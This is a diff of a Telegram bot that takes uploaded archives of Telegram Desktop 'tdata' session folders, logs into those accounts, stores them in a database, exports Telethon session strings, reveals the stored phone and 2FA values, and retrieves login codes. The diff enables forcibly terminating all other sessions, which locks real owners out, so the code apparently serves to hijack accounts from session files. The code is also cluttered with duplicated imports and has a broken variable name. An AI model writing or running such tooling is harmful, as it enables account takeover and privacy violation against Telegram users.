@@ -27,7 +27,17 @@ from pyrogram import Client, filters
 from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
 from telethon import functions
-  # external helper
+import os
+import io
+import re
+import base64
+import shutil
+import zipfile
+import tempfile
+from telethon import TelegramClient
+import os, base64, tempfile, shutil, zipfile
+from telethon import TelegramClient
+from opentele.td import TDesktop
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
 import os
 import tempfile
@@ -37,17 +47,9 @@ import rarfile
 import traceback
 import asyncio
 import hashlib
-
 from telethon.sessions import StringSession
 from telethon import TelegramClient, functions
 from pyrogram import Client, filters
-
-
-
-# --- Helper: read tdata key file
-
-# --- Login with tdata & fetch account info
-
 import os
 import asyncio
 import tempfile
@@ -55,15 +57,29 @@ import shutil
 import zipfile
 import rarfile
 import base64
-
 from pyrogram import Client, filters
 from telethon.errors import SessionPasswordNeededError
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 from opentele.td import TDesktop
 from opentele.api import UseCurrentSession
 import motor.motor_asyncio
-
 from pyrogram import Client as PyroClient
+import re
+import tempfile, zipfile, shutil, os, base64
+from telethon import TelegramClient
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+import tempfile, os, base64, zipfile, shutil, re
+from datetime import datetime, timezone, timedelta
+import os
+import zipfile
+import rarfile
+import tempfile
+import shutil
+from pyrogram import Client, filters
+from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError
+
+
 
 
 API_ID = Config.API_ID
@@ -71,16 +87,12 @@ API_HASH = Config.API_HASH
 
 from pyrogram.session import Session
 from pyrogram.storage.memory_storage import MemoryStorage
-from pyrogram import Client as PyroClient
-
 import re
 import asyncio
 from pyrogram import Client as PyroClient
 from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid, FloodWait
 
 CODE_RE = re.compile(r"(\d{5,6})")
-
-
 
 async def check_2fa(client):
     try:
@@ -116,15 +128,10 @@ async def show_tdata_structure_and_rar(tdata_path: str, message: Message):
     # 2️⃣ Pack into .rar
     tmp_dir = tempfile.mkdtemp()
     rar_path = os.path.join(tmp_dir, "tdata.rar")
-
-    # safer: use shutil.make_archive -> creates zip, then rename to rar
     shutil.make_archive(rar_path.replace(".rar", ""), "zip", tdata_path)
     os.rename(rar_path.replace(".rar", ".zip"), rar_path)  # fake rar extension
 
-    # 3️⃣ Send rar
     await message.reply_document(rar_path, caption="📦 Your TDATA as RAR")
-
-    # 4️⃣ Cleanup
     shutil.rmtree(tmp_dir, ignore_errors=True)
 
 async def show_zip_structure(zip_path, message, client):
@@ -163,7 +170,7 @@ from telethon.tl.functions.auth import ResetAuthorizationsRequest
 
 async def terminate_all_other_sessions(client):
     try:
-      #  await client(ResetAuthorizationsRequest())
+        await client(ResetAuthorizationsRequest())
         return "✅ All other sessions terminated (except this one)."
     except Exception as e:
         return f"❌ Failed to terminate sessions: {e}"
@@ -172,7 +179,7 @@ async def terminate_all_other_sessions(client):
 async def make_pyrogram_session(tdata_path, api_id, api_hash):
     # Create Pyrogram client using tdata folder
     pyro_client = PyroClient(
-        name=tdata_path,   # path where tdata was extracted
+        name=tdata_path,   
         api_id=api_id,
         api_hash=api_hash,
         no_updates=True
@@ -223,23 +230,6 @@ class Database:
 db = Database(Config.DB_URL, Config.DB_NAME)
 
                     
-
-
-
-import os
-import zipfile
-import rarfile
-import tempfile
-import shutil
-
-from pyrogram import Client, filters
-from telethon.errors import SessionPasswordNeededError, PhoneNumberBannedError
-
-# replace with your DB methods
-# from your_db_module import db
-
-
-
 @Client.on_message(filters.document)
 async def handle_archive(client, message):
     tempdir = tempfile.mkdtemp()
@@ -257,7 +247,6 @@ async def handle_archive(client, message):
         await sy.edit(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
         await show_zip_structure(file_path, message, client)
 
-        # --- Step 2: Extraction
         await sy.edit("📦 Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
         try:
             with zipfile.ZipFile(file_path, "r") as zip_ref:
@@ -274,7 +263,6 @@ async def handle_archive(client, message):
                     f"Zɪᴘ ᴇʀʀᴏʀ: {e_zip}\nRᴀʀ ᴇʀʀᴏʀ: {e_rar}"
                 )
 
-        # --- Step 3: Detect or Build tdata
         await sy.edit("🔍 Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")
 
         tdata_paths = []
@@ -325,7 +313,6 @@ async def handle_archive(client, message):
         if not tdata_paths:
             return await sy.edit("⚠️ Nᴏ `ᴛᴅᴀᴛᴀ` ꜰᴏʟᴅᴇʀs ᴅᴇᴛᴇᴄᴛᴇᴅ ɪɴ ᴛʜɪs ᴀʀᴄʜɪᴠᴇ.")
 
-        # --- Step 4: Process tdata
         start_num = await db.get_next_account_num()
         for offset, tdata_path in enumerate(tdata_paths, 1):
             idx = start_num + offset
@@ -395,7 +382,6 @@ async def handle_archive(client, message):
                 results.append(f"#{idx} ❌ Eʀʀᴏʀ: {str(e)}")
                 await message.reply(f"❌ Eʀʀᴏʀ ɪɴ Sᴛᴇᴘ 4.{idx}: {e}")
 
-        # --- Final Report
         report_text = "📑 Fɪɴᴀʟ Rᴇᴘᴏʀᴛ:\n\n" + "\n".join(results)
         report_path = os.path.join(tempdir, "report.txt")
         with open(report_path, "w") as f:
@@ -408,53 +394,23 @@ async def handle_archive(client, message):
     finally:
         shutil.rmtree(tempdir, ignore_errors=True)
 
-
-
-
-
-                        
-
-import os
-import io
-import re
-import base64
-import shutil
-import zipfile
-import tempfile
-from telethon import TelegramClient
-from tdata_converter import convert_tdata
-
-
-import os, base64, tempfile, shutil, zipfile
-from telethon import TelegramClient
-from opentele.td import TDesktop
-
-
 async def check_valid_session(tdata_b64: str, message):
-    """
-    Validate tdata (base64) by logging in with Telethon.
-    Returns: (valid: bool, me: User | None, client: TelegramClient | None)
-    """
     temp_dir = tempfile.mkdtemp()
     tdata_zip = os.path.join(temp_dir, "tdata.zip")
 
     try:
-        # Save base64 → zip file
         with open(tdata_zip, "wb") as f:
             f.write(base64.b64decode(tdata_b64))
 
-        # Extract zip → tdata folder
-        extract_dir = os.path.join(temp_dir, "tdata")
+        extract_dir = os.path.join(tempdir, "tdata")
         with zipfile.ZipFile(tdata_zip, "r") as z:
             z.extractall(extract_dir)
 
-        # Load tdata with OpenTele
         tdesk = TDesktop(extract_dir)
         if not tdesk.isLoaded():
             await message.reply("❌ Invalid TData structure (missing required files)")
             return False, None, None
 
-        # Get Telethon client directly
         tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
         await tele_client.connect()
 
@@ -503,7 +459,7 @@ async def retrieve_account(client, message):
         f"Account #: {acc_num}\n"
         f"Name: {doc['name']}\n"
         f"Phone: {doc['phone']}\n"
-      #  f"2FA: {doc['twofa']}\n"
+        f"2FA: {doc['twofa']}\n"
      #   f"Spam: {doc['spam']}\n"
         f"Status: {status}"
     )
@@ -534,7 +490,6 @@ async def retrieve_options(client, callback_query):
 
         await callback_query.message.edit("⏳ Loading session from TData...")
 
-        # ⬇️ This must return (True/False, user info, active client)
         valid, me, session = await check_valid_session(
             doc["tdata"], callback_query.message
         )
@@ -542,8 +497,6 @@ async def retrieve_options(client, callback_query):
             return await callback_query.message.edit(
                 "❌ Could not load session from TData."
             )
-
-        # TELETHON SESSION EXPORT
         if action == "tele":
             await callback_query.message.edit("⚙️ Generating Telethon session...")
 
@@ -555,7 +508,6 @@ async def retrieve_options(client, callback_query):
                 f"🔑 **Telethon session** for **{me.first_name}** (`{me.id}`):\n\n`{tele_string}`"
             )
             return await callback_query.message.edit("✅ Telethon session sent via DM.")
-        # PHONE
         elif action == "phone":
             phone = doc.get("phone", "❌ Not saved")
             return await callback_query.message.edit(
@@ -571,17 +523,6 @@ async def retrieve_options(client, callback_query):
         )
 
 
-
-import re
-import tempfile, zipfile, shutil, os, base64
-from telethon import TelegramClient
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-import tempfile, os, base64, zipfile, shutil, re
-
-from datetime import datetime, timezone, timedelta
-
-# Define IST timezone (+5:30)
 IST = timezone(timedelta(hours=5, minutes=30))
 
 @Client.on_callback_query(filters.regex(r"^getcode_(\d+)$"))
@@ -641,14 +582,11 @@ from pyrogram import Client, filters
 
 @Client.on_message(filters.command("clean_db") & filters.private)
 async def clean_db(client, message):
-    """Delete all accounts from the database (careful!)."""
     confirmation_text = (
         "⚠️ This will permanently delete ALL accounts in the database.\n"
         "Reply with `YES` to confirm."
     )
     await message.reply(confirmation_text)
-
-    # Wait for user reply
     try:
         response = await client.listen(message.chat.id, timeout=30)
         if response.text.strip().upper() != "YES":
@@ -656,7 +594,6 @@ async def clean_db(client, message):
     except Exception:
         return await message.reply("❌ Timeout. Operation cancelled.")
 
-    # Delete all documents
     result = await db.col.delete_many({})
     await message.reply(f"✅ Database cleaned. Deleted {result.deleted_count} accounts.")
 
